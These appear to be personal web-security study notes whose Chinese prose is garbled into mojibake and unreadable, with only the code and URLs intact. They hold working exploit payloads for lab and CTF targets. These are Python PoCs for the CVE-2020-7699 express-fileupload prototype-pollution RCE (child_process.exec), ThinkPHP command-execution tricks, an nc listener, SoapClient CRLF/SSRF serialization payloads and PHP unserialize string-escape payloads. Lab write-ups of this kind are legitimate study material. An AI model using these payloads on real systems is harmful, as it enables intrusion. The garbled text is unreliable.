# ç¯å¢ƒæ­å»º
## vulhubä»‹ç»
vulhubæ˜¯ä¸€ä¸ªå¼€æºæ¼æ´é¶åœºï¼Œå¯ä»¥åœ¨å®‰è£… dockerå’Œdocker-compose åï¼Œä½¿ç”¨ç®€å•çš„æŒ‡ä»¤æ­å»ºæ¼æ´ç¯å¢ƒï¼Œå…·ä½“ä»‹ç»å¯ä»¥çœ‹å®˜ç½‘ã€‚å¯ä»¥å®‰è£…åœ¨windowsã€linuxä¸Šã€‚

vulhubå®˜ç½‘ï¼š[https://vulhub.org/#/index/](https://vulhub.org/#/index/)

å¯ä»¥å®‰è£…çš„æ¼æ´ç¯å¢ƒï¼š[https://vulhub.org/#/environments/](https://vulhub.org/#/environments/)

## dockerä»‹ç»
dockeræ„æ€å°±æ˜¯å®¹å™¨ï¼Œå¯ä»¥æŠŠæˆ‘ä»¬é…ç½®å¥½çš„ç¯å¢ƒç­‰æ‰“åŒ…åˆ°è¿™ä¸ªå®¹å™¨é‡Œï¼Œä½¿ç”¨çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒçš„é•œåƒã€‚è¿™ä¸ªå®¹å™¨å¯ç§»æ¤æ€§å¼ºï¼Œå¾ˆæ–¹ä¾¿ï¼Œæœ‰windowså’Œlinuxç‰ˆæœ¬ã€‚dockerä¹Ÿæœ‰å¾ˆå¤šç”¨æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæ˜¯ä¸ºäº†ä½¿ç”¨dockeræ­å»ºvulhubé¶åœºçš„ï¼Œæ‰€ä»¥åªä»‹ç»å…³äºvulhubçš„åŠŸèƒ½ï¼Œå³å®‰è£…dockerã€ä½¿ç”¨dockeræŒ‡ä»¤æ­å»ºvulhubç¯å¢ƒã€‚

docker-composeæ˜¯dockerçš„ä¸€ä¸ªå·¥å…·ï¼Œä½¿ç”¨docker-composeæ–¹ä¾¿çš„ç®¡ç†å¤šä¸ªDockerå®¹å™¨ï¼Œéå¸¸é€‚åˆç»„åˆä½¿ç”¨å¤šä¸ªå®¹å™¨è¿›è¡Œå¼€å‘çš„åœºæ™¯ï¼Œå¦‚vulhubã€‚å®‰è£…docker-composeè¦å…ˆå®‰è£…pipã€‚

dockerå®˜ç½‘ï¼š[https://www.docker.com/](https://www.docker.com/)

## php +mysql
[Kaliå®‰è£…Apacheã€MySQLã€PHP_kaliapache2å®‰è£…_black__101çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/za111r/article/details/107444812)

https://www.ajihuo.com/php/4962.html)
# **JSæ¼æ´åˆ†æ(CVE-2020-7699)**
[CVE-2020-7699æ¼æ´åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/vuls/246029.html)
## æ­å»ºjsç¯å¢ƒ
:::info
npmï¼ˆNode Package Managerï¼‰æ˜¯Node.jsçš„åŒ…ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç†å’Œå…±äº«Node.jsæ¨¡å—ã€‚
jsé¡¹ç›®æ¶æ„ï¼š
project
node_modules
src
index.js
views
index.ejs
:::

- é¦–å…ˆé€‰ä¸ªç©ºæ–‡ä»¶å¤¹æ–°å»ºé¡¹ç›®ï¼Œåˆ›å»ºindex.js
```javascript
const express = require('express');
const app = express();

// è®¾ç½®Expressåº”ç”¨ç¨‹åºçš„è§†å›¾å¼•æ“ä¸ºEJS
app.set('view engine', 'ejs');

// åœ¨è·¯ç”±ä¸­ä½¿ç”¨res.render()æ–¹æ³•æ¥å‘ˆç°EJSæ¨¡æ¿æ–‡ä»¶
app.get('/', (req, res) => {
  res.render('index', {title: 'Welcome to My Website'});
});
```

- åˆ›å»ºindex.ejsæ–‡ä»¶
```html
<!DOCTYPE html>
<html>
  <head>
    <title><%= title %></title>
  </head>
  <body>
    <h1><%= title %></h1>
    <p>Welcome to my website!</p>
  </body>
</html>
```

- ç„¶ånpm installéœ€è¦çš„åŒ…
```shell
npm list æŸ¥çœ‹å·²ç»å®‰è£…çš„åŒ…
npm install <package-name> --save å°†å®‰è£…çš„åŒ…æ·»åŠ åˆ°é¡¹ç›®çš„package.jsonæ–‡ä»¶
npm install express --save
```

- è¿™ä¸ªç¯å¢ƒéœ€è¦å®‰è£…3ä¸ªåŒ…
```shell
npm install ejs
npm i express-fileupload@1.1.7-alpha.4
npm install express
```
## å…³äºJsåŸå‹é“¾æ±¡æŸ“çš„æ–°ç†è§£
![å¾®ä¿¡å›¾ç‰‡ç¼–è¾‘_20230429162321.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1682756611270-70cda1e0-3994-4aa1-b6ec-7afb681615a1.jpeg#averageHue=%23cdcbc9&clientId=u10df4e69-9145-4&from=paste&height=1833&id=uecdbeb63&originHeight=1540&originWidth=647&originalType=binary&ratio=2&rotation=90&showTitle=false&size=48290&status=done&style=none&taskId=uc652a0de-49bf-4219-b78e-3cea89cc48c&title=&width=770)
:::info
Objectæ˜¯ä¸ªæ„é€ å‡½æ•°
å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ„é€ å‡½æ•°æ—¶ï¼ŒJavaScriptä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™è¯¥æ„é€ å‡½æ•°çš„prototypeå±æ€§ã€‚è¿™ä¸ªç©ºå¯¹è±¡çš„åŸå‹å¯¹è±¡å°±æ˜¯Object.prototype
:::

## æ¼æ´æºç ç†è§£
```javascript
function processNested(data){
    if (!data || data.length < 1) return {};

    let d = {},
        keys = Object.keys(data);       //è·å–é”®å,åˆ—è¡¨
//è¿™é‡Œå‡è®¾ä¼ å…¥çš„æ•°æ®æ˜¯foo[0].bar[1]ï¼Œ
    for (let i = 0; i < keys.length; i++) {
        let key = keys[i],
            value = data[key],
            current = d,
            keyParts = key
        .replace(new RegExp(/\[/g), '.')
        .replace(new RegExp(/\]/g), '')
        .split('.');
//åˆ°è¿™ä¼šå˜ä¸ºfoo 0 bar 1
        for (let index = 0; index < keyParts.length; index++){
            let k = keyParts[index];
            if (index >= keyParts.length - 1){
                current[k] = value;
            } else {
                if (!current[k]) 
                    current[k] = !isNaN(keyParts[index + 1]) ? [] : {};
              //è¿™é‡Œå¦‚æœæ˜¯æ•°å­—ï¼Œç”¨[]ï¼Œå¦åˆ™æ˜¯å¯¹è±¡ï¼Œç”¨{}
                current = current[k];
            }
        }
    }

    return d;
};
```

- æ­¤æ—¶çš„keypart

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682757303464-75a4edde-b5cc-4e21-a5f9-d9c2e6724e24.png#averageHue=%23272b31&clientId=u10df4e69-9145-4&from=paste&height=451&id=u943d05c2&originHeight=902&originWidth=1537&originalType=binary&ratio=2&rotation=0&showTitle=false&size=199099&status=done&style=none&taskId=u184f7c53-fc5b-405b-bce4-4646d48650c&title=&width=768.5)

- å½“forå¾ªç¯æ‰§è¡Œå®Œæ—¶ï¼Œå‘ç°å·²ç»ç»™Objectæ·»åŠ äº†ä¸€ä¸ªå±æ€§ï¼Œä¸”å€¼æ˜¯æˆ‘è®¾å®šçš„å€¼

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682757534919-e1031ff9-676c-4128-97ca-fc635716225f.png#averageHue=%23252a31&clientId=u10df4e69-9145-4&from=paste&height=430&id=u26be5b8a&originHeight=860&originWidth=1745&originalType=binary&ratio=2&rotation=0&showTitle=false&size=206983&status=done&style=none&taskId=udf9ef393-17ba-49a6-a894-02e8c384bdb&title=&width=872.5)

- ä¸Šé¢æ„å»ºå®Œäº†ï¼Œæ­¤æ—¶æˆ‘ä»¬è·³åˆ°ç”¨çš„åœ°æ–¹

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682758364815-b5170830-3e87-408d-b4b0-435be6c9b9d8.png#averageHue=%231f2023&clientId=u10df4e69-9145-4&from=paste&height=154&id=ubd0e3b2a&originHeight=307&originWidth=1774&originalType=binary&ratio=2&rotation=0&showTitle=false&size=66267&status=done&style=none&taskId=u2a3bd0ac-df7c-405c-8426-57a54c540d6&title=&width=887)

- è¿™é‡Œå‘ç°ctorå°±æ˜¯Functionï¼Œæ ¹æ®chatgptï¼ŒFunctionå¯ä»¥è‡ªå®šä¹‰å‡½æ•°

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682758399255-36c2f92b-9788-472f-b47c-2e4213ffc5b2.png#averageHue=%23f0f1f1&clientId=u10df4e69-9145-4&from=paste&height=506&id=udf633c50&originHeight=1012&originWidth=1233&originalType=binary&ratio=2&rotation=0&showTitle=false&size=188031&status=done&style=none&taskId=u15de536b-06eb-480c-aa87-36fc4b44615&title=&width=616.5)

- æ­¤æ—¶æˆ‘ä»¬çœ‹srcçš„å€¼ï¼Œè¿™é‡Œå·²ç»æ‹¼æˆäº†å‡½æ•°ä¸­çš„è¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œ

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682758475943-11fa7dac-8821-41a8-8528-f431d4326d88.png#averageHue=%232e3135&clientId=u10df4e69-9145-4&from=paste&height=454&id=u05084ea9&originHeight=907&originWidth=1278&originalType=binary&ratio=2&rotation=0&showTitle=false&size=123233&status=done&style=none&taskId=u8afa93a8-7cc4-4609-a60c-44b5b43f1f5&title=&width=639)
## pythonç”¨postä¼ æ–‡ä»¶
:::info

- filesçš„å‚æ•°æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå­—å…¸çš„keyæ˜¯ä¸Šä¼ çš„åŒ…ä¸­çš„nameï¼Œ**valueå¿…é¡»æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯filenameï¼Œç¬¬äºŒå‚æ•°æ˜¯æ–‡ä»¶å¯¹è±¡**
:::

- è¿™æ˜¯ç¬¬ä¸€ç§æ–¹å¼ï¼Œå…ƒç»„çš„ç¬¬äºŒä¸ªä½ç½®æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒå°†è¢«è§†ä¸ºæ–‡ä»¶å†…å®¹
```python
url = "http://192.168.56.128:8001"
cmd = 'cat /root/WebstormProjects/untitled1/src/index.js > /root/WebstormProjects/untitled1/2'
r = requests.post(url, files={
    "__proto__.outputFunctionName": (
        None,
        f"x;process.mainModule.require(\'child_process\').exec(\"{cmd}\");x"
    )
})
print(r.request.body)


```

- è¿™æ˜¯ç¬¬äºŒç§æ–¹å¼ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œç„¶åå†ä½œä¸ºfilesçš„å‚æ•°
```python
url = "http://192.168.56.128:8001"

cmd = 'cat /root/WebstormProjects/untitled1/src/index.js > /root/WebstormProjects/untitled1/2'

x = f"x;process.mainModule.require(\'child_process\').exec(\"{cmd}\");x"
cmd_io = io.StringIO(x)
poc = {"__proto__.outputFunctionName":(None,cmd_io)}
r = requests.post(url, files=poc)
print(r.request.body)

```
## æ€»ç»“

- è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è‡ªå·±æ¼æ´å¤ç°æˆåŠŸï¼Œå…¶ä¸­åŒ…æ‹¬å¼„æ‡‚äº†jsçš„åŸºæœ¬ç»“æ„å’Œä¹‹å‰ä¸€ç›´ä¸æ˜ç™½çš„npmï¼Œnode_modules
- ç”¨webstormæˆåŠŸçš„æ–­ç‚¹è°ƒè¯•
- è¿™é‡Œé‡åˆ°çš„å°é—®é¢˜æ˜¯æˆ‘å®‰è£…çš„express-fileuploadçš„æºç å¥½åƒå·²ç»ä¿®å¤è¿‡æ¼æ´äº†ï¼Œæˆ‘çœ‹åˆ°å®ƒç”¨æ­£åˆ™åŒ¹é…äº†å¯ä»¥ä¸Šä¼ çš„å†…å®¹æ ¼å¼ï¼Œæˆ‘æŠŠæºç æ³¨é‡Šæ‰äº†ä¸€éƒ¨åˆ†ä¹‹åï¼ŒæˆåŠŸè¿è¡Œäº†
- å¤šå¤šå°è¯•ï¼Œæ€»æ˜¯å¯ä»¥çš„ã€‚chatgptå¸®æˆ‘ç†è§£äº†å¾ˆå¤šæˆ‘ä¹‹å‰ä¸ç†è§£çš„ä¸œè¥¿
- åŠ æ²¹ï¼äº‰å–æ—©æ—¥å¯ä»¥æŒ–åˆ°è‡ªå·±çš„æ¼æ´ã€‚

# thinkphpæ¼æ´

## web 569

https://www.kancloud.cn/manual/thinkphp/1697

### Urlæ¨¡å¼

- å…¥å£æ–‡ä»¶æ˜¯åº”ç”¨çš„å•ä¸€å…¥å£ï¼Œå¯¹åº”ç”¨çš„æ‰€æœ‰è¯·æ±‚éƒ½å®šå‘åˆ°åº”ç”¨å…¥å£æ–‡ä»¶ï¼Œç³»ç»Ÿä¼šä»URLå‚æ•°ä¸­è§£æå½“å‰è¯·æ±‚çš„æ¨¡å—ã€æ§åˆ¶å™¨å’Œæ“ä½œï¼š

http://serverName/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ

#### URLå¤§å°å†™

```php
'URL_CASE_INSENSITIVE'  =>  true, 
```

- å½“URL_CASE_INSENSITIVEè®¾ç½®ä¸ºtrueçš„æ—¶å€™è¡¨ç¤ºURLåœ°å€ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™ä¸ªä¹Ÿæ˜¯æ¡†æ¶åœ¨éƒ¨ç½²æ¨¡å¼ä¸‹é¢çš„é»˜è®¤è®¾ç½®ã€‚

#### æ™®é€šæ¨¡å¼

- ä¹Ÿå°±æ˜¯ä¼ ç»Ÿçš„getæ–¹å¼

```php
http://localhost/?module=home&controller=user&action=login&var=value
```

#### PATHINFOæ¨¡å¼

- ç³»ç»Ÿé»˜è®¤çš„æ¨¡å¼
- PATHINFOåœ°å€çš„å‰ä¸‰ä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤º**æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ**

```php
http://localhost/index.php/home/user/login/var/value/
```

- ä¸Šé¢çš„ä¹Ÿå¯ä»¥å†™æˆ

```php
http://localhost/index.php/home/user/login/?var=value
```

## web 570

http://096eff82-c7ca-460a-badf-6ab655523d93.challenge.ctf.show/

### é—­åŒ…è·¯ç”±

https://www.cnblogs.com/leqing/p/6861644.html

```php
'blog/:year/:month' =>
function($year,$month){
echo 'year='.$year.'&month='.$month;
}
```

- å¦‚æœæˆ‘ä»¬è®¿é—®çš„URLåœ°å€æ˜¯ï¼š http://serverName/Home/hello/thinkphp

åˆ™æµè§ˆå™¨è¾“å‡ºçš„ç»“æœæ˜¯ï¼š Hello,thinkphp

### é¢˜ç›®åˆ†æ

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678781815265-620c4d29-f980-4705-8015-49013bd0ab85.png)

- åœ¨config.phpä¸­å‘ç°äº†ä¸€ä¸ªé—­åŒ…è·¯ç”±
- è§åˆ°`call_user_func`ç›´æ¥ä¼ `system`å‡½æ•°
- ä½†æ˜¯æ²¡æ³•ä¼ `ls /`ä¼šå½±å“è·¯å¾„çš„åˆ¤æ–­ï¼Œç”¨`assert`

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678783176911-fc6f084c-99c3-4402-918f-b84d33c2d054.png)

- è¿™ä¸ªé¢˜ä¼ ä¸€ä¸ªassertä¸è¡Œ

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678783404699-bb66b7f9-e4a2-415d-ac93-bc988ddec44a.png)

https://blog.csdn.net/rfrder/article/details/109136388

## web 571 showæ–¹æ³•å‚æ•°å¯æ§

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678784780836-a9806062-79a8-460e-802b-6b10cd25b664.png)

- åœ¨/Application/Home/Controller/IndexController.class.phpæ–‡ä»¶ä¸­ï¼Œå‘ç°è¿™é‡Œçš„`show`æ–¹æ³•ä¸­ä¼ å…¥çš„å‚æ•°`n`æ˜¯å¯ä»¥æ§åˆ¶çš„
- è¿½è¸ªthinkphp3çš„æºç 

```php
protected function show($content,$charset='',$contentType='',$prefix='') {
        $this->view->display('',$charset,$contentType,$content,$prefix);
    }
//æ—¢ç„¶é¢˜ç›®è¦æ±‚çš„æ˜¯æ¸²æŸ“viewä¸­çš„å†…å®¹ï¼Œé‚£å°±è·Ÿè¸ªviewä¸­çš„displayå‡½æ•°
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
        G('viewStartTime');
        // è§†å›¾å¼€å§‹æ ‡ç­¾
        Hook::listen('view_begin',$templateFile);
        // è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹
        $content = $this->fetch($templateFile,$content,$prefix);
        // è¾“å‡ºæ¨¡æ¿å†…å®¹
        $this->render($content,$charset,$contentType);
        // è§†å›¾ç»“æŸæ ‡ç­¾
        Hook::listen('view_end');
    }

---------------------------------------------------------------------------------
public function fetch($templateFile='',$content='',$prefix='') {
        if(empty($content)) {//æ­¤å¤„ä¸ä¸ºç©ºï¼Œå¯ä»¥ç›´æ¥passæ‰
            $templateFile   =   $this->parseTemplate($templateFile);
            // æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ç›´æ¥è¿”å›
            if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        }else{
            defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
        }
        // é¡µé¢ç¼“å­˜
        ob_start();
        ob_implicit_flush(0);
        if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿(æ­¤å¤„å‡½æ•°Cçš„ä½œç”¨æ˜¯ä¼˜å…ˆæ‰§è¡Œè®¾ç½®è·å–æˆ–èµ‹å€¼,å®ƒæœ‰ä¸€ä¸ªåå­—å«åŠ¨æ€é…ç½®)
            $_content   =   $content;
            // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡
            extract($this->tVar, EXTR_OVERWRITE);//EXTR_OVERWRITE - é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚
            // ç›´æ¥è½½å…¥PHPæ¨¡æ¿
            empty($_content)?include $templateFile:eval('?>'.$_content);//æ­¤å¤„ä¸ºå‘½ä»¤æ‰§è¡Œç‚¹
        }else{
            // è§†å›¾è§£ææ ‡ç­¾
            $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
            Hook::listen('view_parse',$params);
        }
        // è·å–å¹¶æ¸…ç©ºç¼“å­˜
        $content = ob_get_clean();
        // å†…å®¹è¿‡æ»¤æ ‡ç­¾
        Hook::listen('view_filter',$content);
        // è¾“å‡ºæ¨¡æ¿æ–‡ä»¶
        return $content;
    }
```

- displayæ–¹æ³•ä¼šè°ƒç”¨`fetch`æ–¹æ³•
- `fetch`æ–¹æ³•ä¸­`if('php' == strtolower(C('TMPL_ENGINE_TYPE')))`å°±ä¼šæ‰§è¡Œevalä»£ç 

## web 572 tp3.2æ—¥å¿—æ³„éœ²

### 0x01

thinkphp3.2ç»“æ„ï¼šApplication/Runtime/Logs/Home/18_07_27.log

thinphp3.2è§£æï¼šApplication/Runtime/Logs/Home/yy_MM_dd

- thinkphpåœ¨å¼€å¯debugçš„æƒ…å†µä¸‹ï¼Œä¼šåœ¨Runtimeç›®å½•ä¸­ç”Ÿæˆæ—¥å¿—ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰åšå¥½ç›®å½•é™åˆ¶ï¼Œå°±å¯ä»¥è®¿é—®

è¯¥ç›®å½•ã€‚













- è®¿é—®`/Application`ï¼Œå‘ç°æ˜¯ç¦æ­¢çš„

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851200839-d0ebed11-a7cb-4b27-862a-1cede3a977ae.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851696403-3b408a50-cae1-4cec-a389-762cc75cd889.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851715583-e2714f29-d4f2-48f2-bd68-15f61fbe7ac4.png)

- è¿™é‡ŒæŠŠæ—¥æœŸæ ¼å¼æ”¹æˆ`yy_MM_dd`

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851769573-6954b58c-76d4-44bd-a81f-c9d2f382b48d.png)

- è®¿é—®åå‘ç°

![img](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678851854699-ae1dab13-c522-4ebc-90aa-8af86ba54c79.png)

- ç›´æ¥è®¿é—®è¿™ä¸ªrce

# ä»0å¼€å§‹Laravel

## å¸¸ç”¨payload

### ssrf+ååºåˆ—åŒ–

#### ssrf

1. æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰æ˜¯æŒ‡æ”»å‡»è€…èƒ½å¤Ÿä»æ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºå‘é€ç²¾å¿ƒè®¾è®¡çš„è¯·æ±‚çš„å¯¹å…¶ä»–ç½‘ç«™è¿›è¡Œæ”»å‡»ã€‚(åˆ©ç”¨ä¸€ä¸ªå¯å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å…¶ä»–æœåŠ¡)
2. æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨ç›®æ ‡å¸®åŠ©æ”»å‡»è€…è®¿é—®å…¶ä»–æƒ³è¦æ”»å‡»çš„ç›®æ ‡
3. æ”»å‡»è€…è¦æ±‚æœåŠ¡å™¨ä¸ºä»–è®¿é—®URL
4. å¯ç”¨äºå†…ç½‘è®¿é—®

#### netstate

https://zhuanlan.zhihu.com/p/397058259

```shell
.\nc64.exe -lvp 9999

ç›‘å¬9999ç«¯å£
-lï¼š å¼€å¯ç›‘å¬
-pï¼šæŒ‡å®šç«¯å£
-tï¼š ä»¥telnetå½¢å¼åº”ç­”
-eï¼šç¨‹åºé‡å®šå‘
-nï¼šä»¥æ•°å­—å½¢å¼è¡¨ç¤ºip
-vï¼šæ˜¾ç¤ºæ‰§è¡Œå‘½ä»¤è¿‡ç¨‹
-z : ä¸è¿›è¡Œäº¤äº’ï¼Œç›´æ¥æ˜¾ç¤ºç»“æœ
-u ï¼šä½¿ç”¨UDPåè®®ä¼ è¾“
-w : è®¾ç½®è¶…æ—¶æ—¶é—´
```

#### æœ¬åœ°æµ‹è¯•

- **SoapClient::__construct**(?string $wsdl, array $options = []) ,SoapClientç±»ï¼Œ
- ç¬¬äºŒä¸ªå‚æ•°ä¸­ uriæŒ‡nameSpacelocation 
- locationï¼šThe URL of the SOAP server to send the request to.

```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999",);
$client->getFlag();  //è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨â€”â€”call()å‡½æ•°æ¥å‘é€è¯·æ±‚
?>
```

- **è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__call()å‡½æ•°æ¥å‘é€è¯·æ±‚**ï¼Œå› æ­¤æ‰å¯ä»¥ç›‘å¬åˆ°
- ç›‘å¬åˆ°çš„ä¿¡æ¯å¦‚ä¸‹:

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625077997-9b1c1c9a-6749-4017-a649-0c90acdc6010.png)

- è¿™é‡Œå¯ä»¥çœ‹åˆ°User-Agentæ˜¯å¯ä»¥æ³¨å…¥çš„

```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1/flag.php",'user_agent'=>$ua));
$client->getFlag();  //è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨â€”â€”call()å‡½æ•°æ¥å‘é€è¯·æ±‚
?>
```

**çŸ¥è¯†ç‚¹ï¼š**

- windowsä¸­ä½¿ç”¨\r\nè¡¨ç¤ºæ¢è¡Œ

- ç›‘å¬åˆ°çš„ä¿¡æ¯å¦‚ä¸‹ï¼š

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625239200-ca560448-2dc1-483b-a9b4-cecae61971ae.png)

- å› ä¸ºContent-lengthæ˜¯13ï¼Œæ‰€ä»¥åˆ°æ ‡è®°2å¤„å°±å·²ç»ç»“æŸäº†ï¼Œåé¢çš„åŒ…æœåŠ¡å™¨ä¼šå¿½ç•¥



#### ä¾‹é¢˜

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625318144-fd0a3466-1cba-4280-947a-5b35b533e776.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625309055-40110109-38fe-4ce2-8bf6-728b0d60a0c0.png)

- ç”±äºè¿™é‡Œä¸å­˜åœ¨getFlag()æ–¹æ³•ï¼Œä¸”éœ€è¦è®¿é—®flag.phpï¼Œç›´æ¥è®¿é—®flag.phpçš„ç»“æœå¦‚ä¸‹ï¼š

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625369217-676b08cb-04dd-4237-97f1-f097d44602a6.png)

- è¿™å°±éœ€è¦ç”¨ssrfå†…ç½‘è®¿é—®

```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1",'user_agent'=>$ua));
// $client->getFlag();  //è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__call()å‡½æ•°æ¥å‘é€è¯·æ±‚
echo urlencode(serialize($client));
?>
```

- åœ¨ååºåˆ—åŒ–åï¼Œä¼šè®¿é—®127.0.0.1/flag.phpï¼Œæ­¤æ—¶å› ä¸ºvip->getFlag()ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç”¨__call()å‡½æ•°æ¥å‘é€è¯·æ±‚
- å› æ­¤åœ¨æˆ‘æ„é€ å¥½çš„$clientä¸­å°±å·²ç»æ»¡è¶³äº†flag.phpçš„è¦æ±‚ï¼Œä¼šå°†flagå†™å…¥flag.txtä¸­
- ç›´æ¥è®¿é—®flag.txtå°±å¯ä»¥è·å¾—flag



### å­—ç¬¦é€ƒé€¸

ä¸‹é¢ä»£ç ä¼šæŠŠå››ä¸ªå­—ç¬¦çš„fuckæ›¿æ¢æˆ5ä¸ªå­—ç¬¦çš„loveUï¼Œè¿™å°±æœ‰é—®é¢˜

å¯¹äºååºåˆ—åŒ–ï¼šåªè¦åé¢æ­£å¸¸é—­åˆï¼Œ**å³ä½¿åˆ†å·åæœ‰å…¶ä»–ä»£ç ï¼Œä¹Ÿå¯ä»¥ç”¨var_dumpæ‰“å°å‡ºååºåˆ—åŒ–çš„ç»“æœ**ã€‚

```
O:7:"message":1:{s:4:"from";}aaaaa
```

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669795927714-6c3f96dd-92cd-4347-99cf-ed0d9bb33a18.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669795864874-470d8ef2-4c03-4627-8103-b73438c82d68.png)

#### åˆ†æ

- é¦–å…ˆ`$msg = new message("fuck","b","c");`ï¼Œå¾—åˆ°ä¸‹é¢ç»“æœ

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669796190523-79ed9561-5047-4624-b409-988a6154694e.png)

- å› ä¸ºè¦æ„é€ æŠŠuseræ”¹ä¸ºadminï¼Œå…ˆæ”¹ä¸€ä¸‹

O:7:"message":4:{s:4:"from";s:4:"fuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}

- æ„é€ æœŸæœ›çš„payloadï¼Œ`$msg = new message('fuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}',"b","c");`
- è¾“å‡ºæ›¿æ¢ååºåˆ—åŒ–çš„ç»“æ„ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶s=66

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669796490985-fe11716b-f85d-4841-8198-718e0ee7017c.png)

- è¦æ„é€ æ­£ç¡®çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå› ä¸ºä¸Šé¢çº¢è‰²payloadçš„é•¿åº¦ä¸º62ã€‚æœ‰ä¸€ä¸ªfuckï¼Œæ›¿æ¢æˆä¸€ä¸ªloveuï¼Œå°±å ä¸€ä½ï¼Œæ‰€ä»¥éœ€è¦62ä¸ªfuckï¼Œè¿™æ ·æ­£å¥½æ˜¯62x4+62=62*5ã€‚
